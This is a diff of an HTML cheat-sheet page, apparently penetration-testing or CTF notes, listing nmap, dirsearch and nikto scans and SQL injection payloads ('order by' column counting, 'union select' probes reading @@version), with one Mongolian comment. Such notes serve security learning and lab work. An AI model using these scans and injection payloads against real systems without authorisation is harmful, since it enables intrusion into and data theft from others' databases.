@@ -7,16 +7,16 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 -oN output to file, in our case it’s called nmap
 </code></pre></div></div><p><br /></p><h3 id="web-exploitation"> Web Exploitation <a href="#web-exploitation">#</a></h3><p><br /></p><h5 id="directory-bruteforcing"> Directory Bruteforcing <a href="#directory-bruteforcing">#</a></h5><p><br /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u http://example.com
 </code></pre></div></div><h5 id="nikto"> Nikto <a href="#nikto">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h $HOST
-</code></pre></div></div><p><br /></p><h5 id="sql-injection"> SQL Injection <a href="#sql-injection">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' order by 1 --
+</code></pre></div></div><p><br /></p><h5 id="sql-injection"> SQL Injection <a href="#sql-injection">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' order by 1 -- -
 ' order by 1 -- -
-' order by 2 --
-' order by 3 --
-' order by 4 --
-' order by 5 --
-' order by 6 --
-' order by 7 --
-' order by 8 --
-' order by 9 --
+' order by 2 -- -
+' order by 3 -- -
+' order by 4 -- -
+' order by 5 -- - 
+' order by 6 -- -
+' order by 7 -- -
+' order by 8 -- -
+' order by 9 -- -
 ' union select 1,2,3,4,5,6,7,8 -- - 
 ( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
 ' union select 1,2,3,@@version,5,6,7,8 -- -
